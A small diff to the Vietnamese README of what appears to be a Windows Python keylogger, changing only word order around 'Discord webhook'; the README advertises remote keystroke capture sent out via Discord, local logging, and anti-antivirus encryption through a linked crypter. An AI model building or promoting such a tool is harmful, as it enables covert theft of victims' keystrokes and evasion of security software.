@@ -8,7 +8,7 @@
 
 ## Tính năng
 
-  - **Keylogger từ xa qua Discord**: Gửi dữ liệu bàn phím thông qua webhook Discord.
+  - **Keylogger từ xa qua Discord**: Gửi dữ liệu bàn phím thông qua Discord webhook.
   - **Keylogger cục bộ**: Lưu trữ dữ liệu bàn phím trực tiếp trên thiết bị.
   - **Mã hóa chống AV (cung cấp bởi [0Beef](https://github.com/memecoder12345678/0BeeF-Python-Crypter.git))**: Mã hóa chống AV.
 
@@ -16,7 +16,7 @@
   
   - Python 3.8 trở lên.
   - Hệ điều hành Windows 10 trở lên.
-  - Kết nối Internet trên máy mục tiêu (nếu sử dụng chế độ Discord Webhook).
+  - Kết nối Internet trên máy mục tiêu (nếu sử dụng chế độ Discord webhook).
 
 ## Cài đặt & sử dụng
 
